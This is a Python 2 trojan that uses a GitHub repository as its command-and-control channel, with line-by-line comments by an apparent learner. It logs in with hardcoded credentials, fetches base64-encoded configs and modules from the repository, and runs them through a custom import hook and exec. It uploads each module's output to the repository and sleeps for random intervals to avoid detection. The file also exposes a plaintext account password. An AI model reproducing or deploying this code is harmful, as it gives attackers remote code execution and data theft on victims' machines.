import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
from github3 import login
trojan_id = "abc"
#each trojan exicutes the json file ment for him there is a json file called abc
trojan_config = "%s.json" % trojan_id
#add .json to the id to create the name of the json file the trojan has to read
data_path = "data/%s/" % trojan_id
trojan_modules= []#empty list for modules
configured = False#flag for configuration
task_queue = Queue.Queue()#task queue is represented by a que


#functions:
def connect_to_github():#log into github
    gh = login(username="haxxx42",password="yotam1709")#details for login
    repo = gh.repository("haxxx42","chapter7")#name of repository
    branch = repo.branch("master")#branch
    return gh,repo,branch#retrun the login info

def get_file_contents(filepath):
    #connect to github and find a file in github
    gh,repo,branch = connect_to_github()#get the details and connect to github
    tree = branch.commit.commit.tree.recurse()#github command to get filename list
    for filename in tree.tree:#search for filename in files
        if filepath in filename.path:#if the file is found
            print "[*] Found file %s" % filepath#notify me
            blob = repo.blob(filename._json_data['sha'])#download it
            return blob.content
    return None#if not found return nothing

def get_trojan_config():
    #get a json file and decode it,then import it
    global configured#flag to flag if trojan is configured
    config_json = get_file_contents(trojan_config)#call the functionn to get file contents from github
    config = json.loads(base64.b64decode(config_json))
    #trojan config filename is the id of the trojan.json,retrieve it from the repository
    configured = True#you are now configured
    for task in config:#go through all tasks
        if task['module'] not in sys.modules:
        #if the task cannot be found call the custom importer from github
            exec("import %s" % task['module'])#do the import
    return config#retrun the config content

def store_module_result(data):#storing module resaults in data section
    gh,repo,branch = connect_to_github()#connect to github
    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
    #store it in a file called like your trojan id in github repository
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))
    #repo action for github create file in repo
    return

class GitImporter(object):#custom importer!
    def __init__(self):#initialize an empty string, place for the code
        self.current_module_code = ""#current module code is empty

    
    def find_module(self,fullname,path=None):#find the module
        if configured:#if the trojan is configured
            print "[*] Attempting to retrieve %s" % fullname
            #notify me if youre attemping to retrieve a module
            new_library = get_file_contents("modules/%s" % fullname)#get entire module contents
            if new_library is not None:#if library is not empty
                self.current_module_code = base64.b64decode(new_library)
                #decode it and put it into the current module code
                return self#return the current module code
        return None#return nothing in case the trojan is not configured

    
    def load_module(self,name):#load a module
        module = imp.new_module(name)#create a blank module object
        exec self.current_module_code in module.__dict__#put all code in the module object
        sys.modules[name] = module#put urself in the module list incase we need to import you again
        return module#return it


def module_runner(module):
    #used for running a module,activates the run function inside the module
    task_queue.put(1)
    result = sys.modules[module].run()
    #put the resault of the module inside resault activate the run fucntion
    #(every module is surrounded by a run function that takes any given number of arguments)
    task_queue.get()#get the task que
    #store the resualt in our repo
    store_module_result(result)#store the module resualt
    return#end function
    # main trojan loop
sys.meta_path = [GitImporter()]#add my custom importer into path
while True:#always be active
    if task_queue.empty():#if there are no tasks in task que
        config = get_trojan_config()#get trojan tasks
        for task in config:#go through each task after u dissasebled the json task file
            t = threading.Thread(target=module_runner,args=(task['module'],))
            #start a new thread of the task so u can run a bunch of tasks at the same time
            t.start()#start the thread
            time.sleep(random.randint(1,10))
            #sleep for a random amount of time so there wont be network patterns to recognize
    time.sleep(random.randint(1000,10000))
    #again sleep for a random amount of time so there wont be an activation pattern














            
